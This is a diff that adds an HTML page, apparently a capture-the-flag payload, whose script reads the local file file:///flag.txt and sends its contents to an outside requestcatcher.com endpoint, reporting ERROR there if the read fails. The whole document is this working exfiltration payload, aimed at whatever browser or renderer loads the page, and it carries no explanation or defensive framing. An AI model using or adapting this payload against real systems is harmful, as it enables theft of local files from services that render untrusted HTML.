@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Local File Access</title>
+</head>
+<body>
+    <div id="fileContent"></div>
+    <script>
+            const filePath = 'file:///flag.txt';
+
+            fetch(filePath)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.text();
+                })
+                .then(data => {
+                    fetch('https://somanyflags_1qaz.requestcatcher.com/' + data);
+                })
+                .catch(error => {
+                    fetch('https://somanyflags_1qaz.requestcatcher.com/ERROR');
+                });
+    </script>
+</body>
+</html>
